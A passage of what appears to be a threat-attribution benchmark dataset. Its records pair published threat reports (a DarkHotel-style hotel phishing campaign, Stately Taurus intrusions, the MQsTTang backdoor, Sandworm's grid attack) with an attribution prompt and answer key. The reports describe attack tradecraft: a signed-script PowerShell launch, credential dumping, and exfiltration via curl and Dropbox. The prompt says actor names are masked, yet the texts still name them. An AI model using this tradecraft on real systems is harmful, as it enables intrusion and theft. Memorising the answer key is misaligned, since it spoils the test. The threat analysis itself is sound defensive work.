“DocumentSummaryInformation” stream provides information regarding the Office version used. In this case, the version is “983040” which is related to Excel 2013.\nThen by looking for the 4-byte PropertySetSystemIdentifier in both “DocumentSummaryInformation” or “Summaryinformation” streams, we can define which OS was used to create the Excel file:\nWe can assume the actor used Windows 8 to create this Excel file, because the 4-byte PropertySetSystemIdentifier indicate the Major and minor version OS, and here Windows 0x06 0x02 = Windows 8.\nThe Excel file was password protected with the default password “VelvetSweatshop”. After decryption, the Excel file displays some decoy information to interest the victim:\n\nThe file embedded macros are triggered when the file is open. Those macros have several mechanisms that we will detail:\nMalicious macros are stored into “Module1.bas” stream.\nThe macros are obfuscated to make the analysis more complex and create a ton of loops to decode strings, orders, etc. to prepare the victim environment for sending information to the C2:\nAs a loop example, one function is dedicated to creating a COM object that loads the Task Scheduler Service by implementing “Schedule.Service” to schedule a task:\nBy using this mechanism, privileged users can schedule a task on the host without using the “schtasks.exe” binary.\nHere are the different schedule task’s settings associated:\n- Connect\n- GetFolder\n- NewTask\n- Settings\n- StartWhenAvailable\n- RunOnlyIfNetworkAvailable\n- StopIfGoingOnBatteries\n- DisallowStartIfOnBatteries\nFunctions summary:\n- Drop VBS script in “C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\”\n- Launch wscript with associated arguments\n- Launch PowerShell with associated command lines\n- Delete created files\n- Check for “Syncappvpublishingserver.vbs” in “\\Sytem32”.\nThe “wscript.exe” binary is used to execute the script dropped earlier in “C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\” named “prcjobs.vbs” in addition to a first PowerShell command line used as an argument, run as:\n“wscript.exe /b /nologo \"C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\prcjobs.vbs\" \"powershell -c”\nThis script is used to set many things. First, it creates many temporary environment variables to allocate space and obtain the computer name and RMOT indicator to indicate to the hard-coded C2 the victim's name. Then, it crafts a stream to exfiltrate this data and connect it to the C2 “fsm-gov.com”. Then there is a function that, we assume, is checking if the host is already compromised by looking for the “sc” string as an environment previously set for the “RMOT” indicator. If the host is compromised, the script will delete files related to the attack.\nAnother Excel file sample used by the group with more PowerShell mechanisms with the same configuration (C2 connection, macros, etc) has been spotted around the same period. We assume the previous sample was the first try from the actor, and this one is the next version:\nIn this case, as previously mentioned, macros and C2 configuration (environment variables, stream crafting, etc.) are the same. Also, metadata are the same as with the previous Excel sheet (operational system and office version used). This means we can assume those Excel sheets have been created on the same machine or at least, by the same group.\nThe main difference with the previous sample lies in the PowerShell mechanisms.\nDuring the macro’s decryption, we mentioned that the file was looking for “SyncappvpublishingServer.vbs” into “\\System32”. The reason is requesting this file with “wscript.exe” in addition to PowerShell command lines as arguments allow the current user to execute a script signed by Microsoft. So basically, trusted and not blocked on the host machine.\nThe first step is calling “SyncappvpublishingServer.vbs” throw “wscript.exe” and pass as arguments the command lines you’d like to use:\nAs you can see, the script is pretty like the previous sample we described earlier. Same mechanisms but called in another way. Then the PowerShell script decoyed as a trusted script:\nThe Command-and-Control server URL “https://fsm-gov.com” is hard-coded and clearly visible in the code. The objective of the script is the same as the previous script.\nCommand-and-Control Examination:\nThe Command-and-Control server, hxxps://fsm-gov(.)com, used to spread this campaign was trying to impersonate a legitimate government website domain for the Federated States of Micronesia. However, the real Micronesia website domain is “fsmgov.org”:\nThe domain used by the C2 is “fsm-gov.com”:\nLooks like the IP is owned by Hivelocity and hosted on “hosterbox.com” who provides shared VPS, this could explain the abundance of unknown other malicious activity. We tried to reach out Hivelocity to get more details for this machine, but they weren’t willing to collaborate.\nThe backend is quite similar as previously reported Command-and-Control related to DarkHotel.\nBy examining the specific C2 server we were able to determine that the threat actors chose to use Mailman to spread the emails to their targets.\nCampaign Objectives:\nBased on targeting, we suspect the group was trying to lay the foundation for a future campaign involving these specific hotels. After researching the event agenda for the targeted hotels, we did indeed find multiple conferences that would have been of interest to the threat actor. For Instance, one hotel was hosting an International Environment Forum and an International Trade & Investment Fair, both of which would attract potential espionage targets.\nBut even threat actors will get unlucky. Due to the rapid rise of COVID-19 in Macao and in China in general, most of events were canceled or postponed. This could explain why the actor stopped spreading their malicious payload after the 18th of January.\nGovernment Alerts:\nThankfully, the Macao Security Force Bureau became aware of the campaign in December 2021:\n\nThe Macao Security Forces Bureau (MSSB) has received a notification from the Cyber Security Incident Alert and Emergency Response Center of the Police Department that a web domain name (fsm- gov.com) with a highly similar name to the official web page of the Macao Security Forces has been discovered, and it is suspected that unlawful elements are using email to send fraudulent emails to commit illegal acts. The Macao Security Forces Affairs Bureau and the Administration have immediately followed up on the situation.\n\nThe Macao Security Forces Affairs Bureau would like to urge and remind the public to be vigilant when browsing the Internet and not to access suspicious links or send any personal information to suspicious websites or emails. If you have any suspicion, please call the complaints and enquiries hotline of the Macao Security Forces Bureau at 87997777 to verify the situation to prevent being deceived. Alternatively, you may call the Judicial Police Fraud Enquiry Hotline at 8800 7777 or the Crime Reporting Hotline at 993 for assistance.\nOther Criminal activity related to the C2 IP:\nEarlier in our report we mentioned that we observed not only the campaign targeting a hotel chain originating from the specific IP but also other malicious activity. One of these campaigns was targeting MetaMask crypto users and presenting them with a Collab.Land phishing page:\nA quick glance at the source of the webpage confirmed our suspicions; MetaMask users were prompted to fill in their credentials which were then sent to a Discord server used for credential harvesting.\n\nGiven the difference in threat actor TTPs, we believe with a high level of confidence that this phishing campaign is not related to the suspected DarkHotel campaign described in this blog. The association of this IP with a large amount of malicious activity would have put this IP on all of the major block lists, essentially limiting their ability to infect their targets right from the start. This unwanted attention does not speak in favor of a cyber espionage campaign and is why we adjusted our confidence level for an APT attack to moderate.\nConclusion:\nRegardless of the exact threat actor attribution, this campaign demonstrates that the hospitality sector is indeed a valid target for espionage operations. Executives should be aware that the (cyber) security of their respective organizations doesn’t stop at the edge of their network. In the past, there have seen multiple examples where knowing who was staying where and attending which conference was an essential step in a threat actor targeting process, which either led to a digital or in-person follow up. In this campaign, the COVID-19 restrictions threw a wrench in the threat actor’s engine, but that doesn’t mean they have abandoned this approach.\nTherefore, we advise travelers to use their security due diligence when travelling from hotel to hotel. Only bring the essential devices with limited data, keep security systems up to date and make use of a VPN service when using hotel Wi-Fi.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "DarkHotel"
    },
    {
        "url": "https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/",
        "Text": "Cyberespionage Attacks Against Southeast Asian Government Linked to Stately Taurus, Aka Mustang Panda\nExecutive Summary\nAn advanced persistent threat (APT) group suspected with moderate-high confidence to be Stately Taurus engaged in a number of cyberespionage intrusions targeting a government in Southeast Asia. The intrusions took place from at least the second quarter of 2021 to the third quarter of 2023. Based on our observations and analysis, the attackers gathered and exfiltrated sensitive documents and other types of files from compromised networks.\nWe found this activity as part of an investigation into compromised environments within a Southeast Asian government. We identified this cluster of activity as CL-STA-0044.\nOur analysis of this cluster of activity revealed attempts to establish a robust and enduring foothold within compromised networks and steal sensitive information related to individuals of interest working for the government.\nWith moderate-high confidence, we conclude that this activity is linked to the Chinese cyberespionage group Stately Taurus. This group is also known by several aliases, including Mustang Panda, BRONZE PRESIDENT, TA416, RedDelta and Earth Preta. Over the years, Unit 42 has observed the group gathering information on targets in and around the Southeast Asia region.\nThis attribution is underpinned by the utilization of distinctive, rare tools such as the ToneShell backdoor that have not been publicly documented in association with any other known threat actor.\nOur description of this cluster of activity provides deep technical insights into the tools and approaches used by the APT. It also includes a timeline of activity that can help defenders obtain crucial information, which you can use to hunt for nation-state advanced persistent threats.\nPalo Alto Networks customers receive protections against the threats discussed in this article through Advanced WildFire, Advanced URL Filtering, DNS Security, Cortex XDR and Cortex XSIAM, as detailed in the conclusion.\nOrganizations can engage the Unit 42 Incident Response team for specific assistance with this threat and others.\nCL-STA-0044 Details\nReconnaissance\nTo better understand the breached networks, the threat actor behind CL-STA-0044 scanned infected environments to find live hosts and open ports, as well as existing domain users and domain groups.\nWe observed the adversary using several different tools to reach these goals:\n•\tLadonGo: LadonGo is an open-source scanning framework that Chinese-speaking developers created. The threat actor used LadonGo to scan for live hosts and open ports using commands like smbscan, pingscan and sshscan.\n•\tNBTScan: NBTScan is a program for scanning IP networks for NetBIOS name information.\n•\tAdFind: AdFind is a command-line query tool that can gather information from Active Directory. The threat actor renamed the tool a.logs.As shown in Figure 2, the threat actor saved the results of AdFind to the following filenames:\no\tDomain_users_light.txt\no\tDomain_computers_light.txt\no\tDomain_groups_light.txt\nThese filenames have only been mentioned in a GitHub page about “Penetration Testing Methodology References.”\n•\tImpacket: The Impacket collection includes many tools with functions related to remote execution, Kerberos attacks, credential dumping and more. Figure 3 illustrates these commands. The threat actor used Impacket to gather information about the network, discover machines and users, and query directories on remote machines for interesting files to exfiltrate.\nCredential Stealing\nUnit 42 researchers observed the threat actor behind the CL-STA-0044 activity attempting to use several techniques for credential stealing to dump passwords from different hosts and the Active Directory:\n•\tHdump: The threat actor deployed and used Hdump.exe (renamed h64.exe), which is a credential stealing utility that researchers have observed Chinese threat actors using. Threat actors used Hdump to dump credentials from memory using the -a (dump all) flag.\n•\tMimiKatz: The threat actor attempted to dump the memory of lssas.exe several times, using the credential harvesting tool MimiKatz (named l.doc) to extract users’ credentials.\n•\tDCSync: The threat actor attempted to use MimiKatz’s DCSync feature, which enables attackers to simulate a domain controller (DC), in the victim’s network to retrieve user credentials from the legitimate DC. They then saved the collected information to a file named log.txt.\n•\tStealing the Ntds.dit File: To steal Active Directory data, the threat actor used the Vssadmin tool to create a volume shadow copy of the C:\\ drive on the DC. They then retrieved the Ntds.dit file from the shadow copy, as shown in Figure 6.\nThe Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, group membership and (most importantly) password hashes.\nThe threat actor also stole the SYSTEM file containing the boot key. This key is necessary to decrypt the Ntds.dit file.\nAbusing Existing Antivirus Software\nWe observed the threat actor behind the CL-STA-0044 activity abusing existing antivirus software in compromised environments. We spotted threat actors abusing ESET’s Remote Administrator Agent to execute commands on remote hosts and to install backdoors.\nThey used the process ERAAgent.exe to execute BAT files with a naming pattern of C:\\Windows\\Temp\ra-run-command-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.bat (where xxx is replaced with random numbers and characters).\nThese .bat files executed reconnaissance commands and wrote additional backdoors to the disk, as shown in Figure 7. The files appear to be responsible for executing commands initiated by ESET’s Run Command task.\n \nMaintaining Access: Web Shells and Backdoors\nDuring this campaign, the threat actor behind CL-STA-0044 used several methods to maintain a foothold in compromised environments. These methods include using multiple backdoors and web shells.\nToneShell Undocumented Variant\nOne of the popular backdoors the threat actor behind CL-STA-0044 used in this campaign is an undocumented variant of a piece of malware dubbed ToneShell. Trend Micro reported that Stately Taurus has used this malware.\nUnlike the previously reported version of ToneShell, which uses shellcode as the payload of the malware, the new variant’s full functionality is built from three DLL components working in tandem.\nEach DLL component has a different purpose:\n•\tPersistence component: in charge of persistence for the backdoor and dropping the other components to disk.\n•\tNetworking component: in charge of command and control (C2) communication.\n•\tFunctionality component: in charge of executing the different commands of the backdoor.\nFurthermore, each component of ToneShell is loaded into a different legitimate process via DLL sideloading. Internal communication between the components is done via the use of pipes.\nComparing the undocumented variant with the previously reported shellcode variant as shown in Figure 8, there is a clear indication of overlap in the codebase and functionality, as well as in the strings. These strings are saved as stack strings in the shellcode variant.\nThe Persistence Component\nThe persistence component (nw.dll, nw_elf.dll) is sideloaded into PwmTower.exe, a component of Trend Micro’s Password Manager, which is a known security tool.\nThe persistence component will create a different type of persistence depending on the process’ privileges. If it has sufficient rights, the persistence component will create two types of persistence:\n•\tService named DISMsrv (Dism Images Servicing Utility Service)\n•\tScheduled task named TabletPCInputServices or TabletInputServices\nIf it does not have sufficient rights, the persistence component will create another two types of persistence:\n•\tRegistry run key named TabletPCInputServices or TabletInputServices\n•\tScheduled task named TabletPCInputServices or TabletInputServices\nOnce the persistence component is executed as a service, it drops the other components to disk and executes the networking component.\nThe Networking Component\nThe networking component (rw32core.dll) is sideloaded into Brcc32.exe, the resource compiler of Embarcadero, an app development tool.\nThe networking component uses the domain www.uvfr4ep[.]com for C2 communication. Then, through the use of pipes, it communicates with the functionality component to execute commands from the C2.\nThe Functionality Component\nThe functionality component (secur32.dll) is sideloaded to Consent.exe, which is a Windows binary that the file metadata identifies as “Consent UI for administrative applications.”\nFunctionality component capabilities include the following:\n•\tExecuting commands\n•\tFile system interaction\n•\tDownloading and uploading files\n•\tKeylogging\n•\tScreen capturing\nWeb Shells\nIn addition to maintaining access to victim environments via various backdoors, in some instances, the threat actor also maintained their access via China Chopper web shells. In one instance, one of the backdoors appeared to malfunction and crash on an infected host. To overcome that, the threat actor used their web shell access to troubleshoot the malfunctioning backdoors.\nCobalt Strike\nOn top of using their web shell access, the threat actor also delivered a Cobalt Strike agent to the infected host that had malfunctioning backdoors. They deployed the Cobalt Strike agent under the name libcurl.dll.\nThe threat actor used DLL sideloading to abuse the legitimate process GUP.exe, which is a component of Notepad++, to execute the malicious agent.\nAfter deployment, the threat actor deleted the Cobalt Strike agent fairly quickly. This could imply that they only deployed the agent to gain additional functionality momentarily, to allow them to troubleshoot the malfunctioning backdoors.\nShadowPad\nOn several occasions, the threat actor behind CL-STA-0044 deployed the ShadowPad backdoor. ShadowPad is a modular malware that has been in use by multiple Chinese threat actors since at least 2015. ShadowPad is considered to be the successor of PlugX, another example of modular malware popular with Chinese threat actors.\nThe threat actor abused DLL sideloading to load the ShadowPad module (log.dll) into a legitimate executable (BDReinit.exe), which is a component of Bitdefender Crash Handler (renamed as net.exe) security tool. When log.dll is loaded into memory, it searches for a file named log.dll.dat that is saved in the same directory to decrypt shellcode and execute the payload.\nAs shown in Figure 10, ShadowPad then spawns and injects code into wmplayer.exe, which in turn spawns and injects code into dllhost.exe. Researchers from Elastic Security Labs have described this behavior in the past.\nShadowPad creates persistence using the service DataCollectionPublisingService (DapSvc) for the renamed BDReinit.exe (net.exe). Figure 10 illustrates the process tree for ShadowPad.\nHighly Targeted and Intelligence-Driven Operation\nTargeting Specific Individuals\nAnalysis of the threat actor’s actions suggests that the threat actor behind CL-STA-0044 has performed considerable intelligence work on their victims. In several instances, Unit 42 researchers observed threat actors using the known Lolbin utility wevtutil to gather information about specific usernames belonging to individuals who work at the victim organizations.\nThe threat actor searched for Windows Security Log Event ID 4624, which is an event that documents successful login attempts. They also searched for Windows Security Log Event ID 4672, which is an event that documents assignments of sensitive privileges to new login sessions.\nThe threat actor used these log events to find out which machines specific users of interest logged in to, to pinpoint hostnames of interest. The threat actor would later compromise these machines and gather sensitive data from them for exfiltration. Figure 11 shows wevtutil used to search for successful login attempts.\nExfiltration\nThroughout this attack, the threat actor attempted to exfiltrate many documents and other sensitive information from the compromised machines. Before exfiltration, the threat actor used rar.exe to archive the files of interest.\nFigure 12 shows that, on some occasions, the threat actor searched for specific file extensions. On other occasions, they archived full directories.\nThe threat actor used a variety of tools to initiate their exfiltration. On already compromised hosts, they used the ToneShell backdoor to execute rar.exe. To access other uncompromised hosts, they used tools like Impacket and RemCom to execute rar.exe remotely. RemCom is a remote shell or telnet replacement that lets you execute processes on remote Windows systems.\nOn hosts of interest, the threat actor created persistence for a script that is in charge of archiving files (autorun.vbs), as shown in Figure 13. To do this, they saved the VBS script in the startup directory, which causes it to run every time the machine is turned on. This behavior could indicate the threat actor’s goal of getting a continuous flow of intelligence from the victims instead of just being a one and done operation.\nAfter archiving the files, we observed the threat actor using two exfiltration methods. The first method is uploading the files using curl and ftp to a cloud storage site named ftp.1fichier[.]com.\nThe second method observed is uploading the archived files to Dropbox, a file hosting service as shown in Figure 14. This method of exfiltration is popular with threat actors because Dropbox the service is one people often use legitimately, making malicious activity harder to detect.\n Figure 14. Data exfiltration using Dropbox.\nThreat actors often abuse, take advantage of or subvert legitimate products for malicious purposes. This does not necessarily imply a flaw or malicious quality to the legitimate product being abused.\nAttribution\nBased on the analysis of the information available to us, we assess with moderate-high confidence that the activity observed as part of CL-STA-0044 is associated with the APT group Stately Taurus. This group is also known as Mustang Panda, BRONZE PRESIDENT, TA416, RedDelta and Earth Preta.\nThe first axis of attribution is the backdoors used in the cluster. The main backdoor used by the threat actor behind CL-STA-0044 is an undocumented variant of the ToneShell backdoor, a backdoor that Trend Micro previously reported Stately Taurus has used. ToneShell appears to be a tool unique to the group. At the time of writing this article, no other known APT groups have been publicly documented as using the ToneShell backdoor.\nIn addition, the threat actor behind CL-STA-0044 deployed the ShadowPad backdoor. ShadowPad is a complex and modular piece of malware that has been used exclusively by Chinese-sponsored threat actors since at least 2015. Furthermore, the filenames and behavior of ShadowPad observed during this campaign overlap with behavior that researchers from Elastic Security Labs have described in the past. This activity resembles the TTPs of threat actors that are believed to operate on behalf of the Chinese nexus.\nThe second axis of attribution is victimology. We observed the activity associated with CL-STA-0044 targeting the government sector in a country in Southeast Asia. Stately Taurus was previously reported to target the government sector in that region.\nThe combination of unique tools and activities we observed raise strong suspicion that the threat actor behind CL-STA-0044 is likely the Stately Taurus APT group. This includes the ToneShell backdoor commonly used by Stately Taurus, along with the deployment of the Chinese state sponsored and APT-affiliated backdoor ShadowPad, as well as their victimology.\nConclusion\nThis article describes the activities of CL-STA-0044, one of three clusters that we observed targeting the government sector in a Southeast Asian country. We associate the activity of the threat actor behind CL-STA-0044 with Stately Taurus with moderate-high confidence.\nDuring the operation, the threat actor slowly took control of the victims' environments, focusing on maintaining control for a long-term operation. The purpose of the threat actor’s efforts appear to be the continuous gathering and exfiltration of sensitive documents and intelligence.\nWe encourage all organizations to leverage our findings to inform the deployment of protective measures to defend against this threat group.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "MUSTANG PANDA"
    },
    {
        "url": "https://www.welivesecurity.com/2023/03/02/mqsttang-mustang-panda-latest-backdoor-treads-new-ground-qt-mqtt/",
        "Text": "MQsTTang: Mustang Panda’s latest backdoor treads new ground with Qt and MQTT\n\nESET researchers have analyzed MQsTTang, a new custom backdoor that we attribute to the Mustang Panda APT group. This backdoor is part of an ongoing campaign that we can trace back to early January 2023. Unlike most of the group’s malware, MQsTTang doesn’t seem to be based on existing families or publicly available projects.\nMustang Panda is known for its customized Korplug variants (also dubbed PlugX) and elaborate loading chains. In a departure from the group’s usual tactics, MQsTTang has only a single stage and doesn’t use any obfuscation techniques.\nVictimology\nWe have seen unknown entities in Bulgaria and Australia in our telemetry. We also have information indicating that this campaign is targeting a governmental institution in Taiwan. However, due to the nature of the decoy filenames used, we believe that political and governmental organizations in Europe and Asia are also being targeted. This would also be in line with the targeting of the group’s other recent campaigns. As documented by fellow researchers at Proofpoint, Mustang Panda has been known to target European governmental entities since at least 2020 and has increased its activity in Europe even further, since Russia’s invasion of Ukraine. Figure 1 shows our view of the targeting for this campaign.\nAttribution\nWe attribute this new backdoor and the campaign to Mustang Panda with high confidence based on the following indicators.\nWe found archives containing samples of MQsTTang in two GitHub repositories belonging to the user YanNaingOo0072022. Another GitHub repository of the same user was used in a previous Mustang Panda campaign described by Avast in a December 2022 blogpost.\nOne of the servers used in the current campaign was running a publicly accessible anonymous FTP server that seems to be used to stage tools and payloads. In the /pub/god directory of this server there are multiple Korplug loaders, archives, and tools that were used in previous Mustang Panda campaigns. This is the same directory that was used by the stager described in the aforementioned Avast blogpost. This server also had a /pub/gd directory, which was another path used in that campaign.\nSome of the infrastructure used in this campaign also matches the network fingerprint of previously known Mustang Panda servers.\nTechnical analysis\nMQsTTang is a barebones backdoor that allows the attacker to execute arbitrary commands on a victim’s machine and get the output. Even so, it does present some interesting characteristics. Chief among these is its use of the MQTT protocol for C&C communication. MQTT is typically used for communication between IoT devices and controllers, and the protocol hasn’t been used in many publicly documented malware families. One such example is Chrysaor, also known as Pegasus for Android. From an attacker’s perspective, one of MQTT’s benefits is that it hides the rest of their infrastructure behind a broker. Thus, the compromised machine never communicates directly with the C&C server. As seen in Figure 2, this capability is achieved by using the open source QMQTT library. This library depends on the Qt framework, a large part of which is statically linked in the malware. Using the Qt framework for malware development is also fairly uncommon. Lazarus’s MagicRAT is one of the rare recently documented examples.\n\nMQsTTang is distributed in RAR archives which only contain a single executable. These executables usually have names related to Diplomacy and passports such as:\n•\tCVs Amb Officer PASSPORT Ministry Of Foreign Affairs.exe\n•\tDocuments members of delegation diplomatic from Germany.Exe\n•\tPDF_Passport and CVs of diplomatic members from Tokyo of JAPAN.eXE\n•\tNote No.18-NG-23 from Embassy of Japan.exe\nThese archives are hosted on a web server with no associated domain name. This fact, along with the filenames, leads us to believe that the malware is spread via spearphishing.\nSo far, we have only observed a few samples. Besides variations in some constants and hardcoded strings, the samples are remarkably similar. The only notable change is the addition of some anti-analysis techniques in the latest versions. The first of these consists of using the CreateToolhelp32Snapshot Windows API function to iterate through running processes and look for the following known debuggers and monitoring tools.\n•\tcheatengine-x86_64.exe\n•\tollydbg.exe\n•\tida.exe\n•\tida64.exe\n•\tradare2.exe\n•\tx64dbg.exe\n•\tprocmon.exe\n•\tprocmon64.exe\n•\tprocexp.exe\n•\tprocesshacker.exe\n•\tpestudio.exe\n•\tsystracerx32.exe\n•\tfiddler.exe\n•\ttcpview.exe\nNote that, while the malware is a 32-bit executable, it only checks for the presence of x64dbg and not its 32-bit counterpart, x32dbg.\nThe second technique uses the FindWindowW Windows API to look for the following Window Classes and Titles used by known analysis tools:\n•\tPROCMON_WINDOW_CLASS\n•\tOLLYDBG\n•\tWinDbgFrameClass\n•\tOllyDbg - [CPU]\n•\tImmunity Debugger - [CPU]\nWhen executed directly, the malware will launch a copy of itself with 1 as a command line argument. This is repeated by the new process, with the argument being incremented by 1 on every run. When this argument hits specific values, certain tasks will be executed. Note that the exact values vary between samples; the ones mentioned below correspond to the sample with SHA-1 02D95E0C369B08248BFFAAC8607BBA119D83B95B. However, the tasks themselves and the order in which they are executed is constant.\nFigure 3 shows an overview of this behavior along with the tasks that are executed when the malware is first run.\nTable 1 contains a list of the tasks and the value at which each of them is executed. We will describe them in further detail in the upcoming paragraphs.\nIf any analysis tool or debugger is detected using the techniques we described previously, the behavior of task 1 is altered and tasks 2, 3, and 4 are skipped entirely.\nTask 1: C&C communication\nAs was previously mentioned, MQsTTang communicates with its C&C server over the MQTT protocol. All observed samples use 3.228.54.173 as broker. This server is a public broker operated by EMQX, who also happen to be the maintainers of the QMQTT library. This could be a way to make the network traffic seem legitimate and to hide Mustang Panda’s own infrastructure. Using this public broker also provides resiliency; the service is unlikely to be taken down because of its many legitimate users and, even if the current C&C servers are banned or taken down, Mustang Panda could spin up new ones and use the same MQTT topics without disrupting MQsTTang’s operation.\nHowever, this campaign could also be a test case by Mustang Panda before deciding whether to invest the time and resources to set up their own broker. This is supported by the low number of samples we’ve observed and the very simple nature of MQsTTang.\nAs shown in Figure 4, the malware and C&C server use two MQTT topics for their communication. The first one, iot/server2, is used for communication from the client to the server. The second one is used for communication from the server to the client. It follows the format iot/v2/<Unique ID> where <Unique ID> is generated by taking the last 8 bytes, in hex form, of a UUID. If any analysis tool is detected, server2 and v2 are respectively replaced with server0 and v0. This is likely in order to avoid tipping off defenders by entirely aborting the malware’s execution early.\nAll communication between the server and the client uses the same encoding scheme. The MQTT message’s payload is a JSON object with a single attribute named msg. To generate the value of this attribute, the actual content is first base64 encoded, then XORed with the hardcoded string nasa, and base64 encoded again. We will describe the exact format of these payloads in the relevant sections.\nUpon first connecting to the broker, the malware subscribes to its unique topic. Then, and every 30 seconds thereafter, the client publishes a KeepAlive message to the server’s topic. The content of this message is a JSON object with the following format:\n{\n    \"Alive\": \"<malware’s uptime in minutes>\",    \n    \"c_topic\": \"<client’s unique topic>\"\n}\nWhen the server wants to issue a command, it publishes a message to the client’s unique topic. The plaintext content of this message is simply the command to be executed. As shown in Figure 5, the client executes the received command using QProcess::startCommand from the Qt framework. The output, obtained using QProcess::readAllStandardOutput, is then sent back in a JSON object with the following format:\n{\n    \"c_topic\": \"<client’s unique topic>\",\n    \"ret\": \"<Command output>\"\n}\nSince only the content of standard output is sent back, the server will not receive errors or warnings. From the server’s point of view, a failed command is thus indistinguishable from a command that simply produces no output unless some sort of redirection is performed.\nTasks 2 and 3: Copying the malware\nThe second and third tasks are fairly similar to each other. They copy the malware’s executable to a hardcoded path; c:\\users\\public\\vdump.exe and c:\\users\\public\\vcall.exe respectively. The filenames used are different for each sample, but they are always located in the C:\\users\\public directory.\nIn the second task, the newly created copy is then launched with the command line argument 97.\nTask 4: Establishing persistence\nPersistence is established by the fourth task, which creates a new value qvlc set to c:\\users\\public\\vcall.exe under the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key. This will cause the malware to be executed on startup.\nWhen MQsTTang is executed on startup as c:\\users\\public\\vcall.exe, only the C&C communication task is executed.\nConclusion\nThe Mustang Panda campaign described in this article is ongoing as of this writing. The victimology is unclear, but the decoy filenames are in line with the group’s other campaigns that target European political entities.\nThis new MQsTTang backdoor provides a kind of remote shell without any of the bells and whistles associated with the group’s other malware families. However, it shows that Mustang Panda is exploring new technology stacks for its tools. It remains to be seen whether this backdoor will become a recurring part of the group’s arsenal, but it is one more example of the group’s fast development and deployment cycle.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "MUSTANG PANDA"
    },
    {
        "url": "https://cloud.google.com/blog/topics/threat-intelligence/sandworm-disrupts-power-ukraine-operational-technology/?hl=en",
        "Text": "Sandworm Disrupts Power in Ukraine Using a Novel Attack Against Operational Technology\n\nIn late 2022, Mandiant responded to a disruptive cyber physical incident in which the Russia-linked threat actor Sandworm targeted a Ukrainian critical infrastructure organization. This incident was a multi-event cyber attack that leveraged a novel technique for impacting industrial control systems (ICS) / operational technology (OT). The actor first used OT-level living off the land (LotL) techniques to likely trip the victim’s substation circuit breakers, causing an unplanned power outage that coincided with mass missile strikes on critical infrastructure across Ukraine. Sandworm later conducted a second disruptive event by deploying a new variant of CADDYWIPER in the victim’s IT environment.\nThis attack represents the latest evolution in Russia’s cyber physical attack capability, which has been increasingly visible since Russia’s invasion of Ukraine. The techniques leveraged during the incident suggest a growing maturity of Russia’s offensive OT arsenal, including an ability to recognize novel OT threat vectors, develop new capabilities, and leverage different types of OT infrastructure to execute attacks. By using LotL techniques, the actor likely decreased the time and resources required to conduct its cyber physical attack. While Mandiant was unable to determine the initial intrusion point, our analysis suggests the OT component of this attack may have been developed in as little as two months. This indicates that the threat actor is likely capable of quickly developing similar capabilities against other OT systems from different original equipment manufacturers (OEMs) leveraged across the world.\nWe initially tracked this activity as UNC3810 before merging the cluster with Sandworm. Sandworm is a full-spectrum threat actor that has carried out espionage, influence and attack operations in support of Russia's Main Intelligence Directorate (GRU) since at least 2009. The group's long-standing center focus has been Ukraine, where it has carried out a campaign of disruptive and destructive attacks over the past decade using wiper malware, including during Russia's re-invasion in 2022. Beyond Ukraine, the group continues to sustain espionage operations that are global in scope and illustrative of the Russian military's far-reaching ambitions and interests in other regions. Government indictments have linked the group to the Main Center for Special Technologies (also known as GTsST and Military Unit 74455). Given Sandworm’s global threat activity and novel OT capabilties, we urge OT asset owners to take action to mitigate this threat. We include a range of detections, hunting and hardening guidance, MITRE ATT&CK mappings and more in the appendices of this blog post.\nIf you need support responding to related activity, please contact Mandiant Consulting. Further analysis of Sandworm threat activity is available as part of Mandiant Advantage Threat Intelligence.\nIncident Summary\nBased on our analysis, the intrusion began on, or prior to, June 2022 and culminated in two disruptive events on October 10 and 12, 2022. While we were unable to identify the initial access vector into the IT environment, Sandworm gained access to the OT environment through a hypervisor that hosted a supervisory control and data acquisition (SCADA) management instance for the victim’s substation environment. Based on evidence of lateral movement, the attacker potentially had access to the SCADA system for up to three months.\nOn October 10, the actor leveraged an optical disc (ISO) image named “a.iso” to execute a native MicroSCADA binary in a likely attempt to execute malicious control commands to switch off substations. The ISO file contained at least the following:\n•\t“lun.vbs”, which runs n.bat\n•\t“n.bat”, which likely runs the native scilc.exe utility\n•\t“s1.txt”, which likely contains the unauthorized MicroSCADA commands\nBased on a September 23 timestamp of “lun.vbs”, there was potentially a two-month time period from when the attacker gained initial access to the SCADA system to when they developed the OT capability. Although we were not able to fully recover the ICS command execution implemented by the binary, we are aware that the attack resulted in an unscheduled power outage. Figure 1 contains a visualization of the execution chain resulting in the disruptive OT event.\nTwo days after the OT event, Sandworm deployed a new variant of CADDYWIPER in the victim’s IT environment to cause further disruption and potentially to remove forensic artifacts. However, we note that the wiper deployment was limited to the victim’s IT environment and did not impact the hypervisor or the SCADA virtual machine. This is unusual since the threat actor had removed other forensic artifacts from the SCADA system in a possible attempt to cover their tracks, which would have been enhanced by the wiper activity. This could indicate a lack of coordination across different individuals or operational subteams involved in the attack.\nA deeper dive on the attack lifecycle and OT capability can be found in the Technical Analysis section of the blog post.\nSandworm’s Threat Activity Reveals Insights into Russia’s Offensive Cyber Capabilities\nSandworm’s substation attack reveals notable insights into Russia’s continued investment in OT-oriented offensive cyber capabilities and overall approach to attacking OT systems. This incident and last year’s INDUSTROYER.V2 incident both show efforts to streamline OT attack capabilities through simplified deployment features. We observed the same 